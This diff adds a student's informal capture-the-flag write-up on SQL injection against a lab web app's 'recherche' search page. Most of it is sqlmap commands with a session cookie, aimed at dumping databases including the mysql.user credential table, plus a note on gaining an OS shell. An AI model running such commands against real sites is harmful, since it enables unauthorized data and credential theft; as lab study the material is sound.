@@ -1,0 +1,56 @@
+
+So to find this flag, i need to do basic sql injection, so I need to tell the command
+where I\m gonna inject the databse, theres a vulnerability in the recherche old page
+using the html code i found of the page, the input parameter is named recherche
+so i specfified that using -p recherche, 
+
+--dump i dumped those in my kali under /.local/share/sqlmap/output
+--batch to say yes to all custom prompts during the injection
+--risk to go through all risks to inject (1 to 3, 3 being the highest)
+--level to go thru all levels and ways of sql injection, (1 to 5, 5 is highest)
+-u to specify the url which has the parameter
+--data to show the input parameter
+--drop-set-cookie to ignore new coookie and maintain mine and use mine
+--text-only makes sure it only sends back text instead of html
+--dbs to show all possible databases
+-D to specify database and then --tables to see the tables inside the database
+--os-shell gives u the shell access to the database
+   
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --text-only --batch --dbs
+command to list out all databases
+
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --tables --batch
+command to list the tables in the cuiter database
+
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D cuiteur --dump --batch
+dump it on my local drive
+
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" --data="recherche=&btnRechercher=Rechercher" --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" -p recherche --level=5 --risk=3 --text-only --drop-set-cookie -D mysql -T user --dump --batch
+dump a specific table on my local drive
+
+
+
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" \
+  --data="recherche=&btnRechercher=Rechercher" \
+  --cookie="PHPSESSID=tv27194dltn7srq401bhf4r237" \
+  -p recherche \
+  --level=5 \
+  --risk=3 \
+  --text-only \
+  --drop-set-cookie \
+  --batch
+
+
+sqlmap -u "http://10.0.2.197/php/recherche_old.php" \
+  --cookie="PHPSESSID=mh7tkt1n251va88ocamt5bhcp7" \
+  --data="recherche=test&btnRechercher=Rechercher" \
+  -p recherche \
+  --dump \
+  --batch
+
+this is the command i used to find flag
+flag{de3b1c and i did sql injection to do it
+so u find a input query, do ' in the input query to find if it throws a databse error
+its injectible, if not then not
+i went to the old recherche page and in the search function ' it says welcome to the
+matrix, watch a vieo on sql injection and understand data
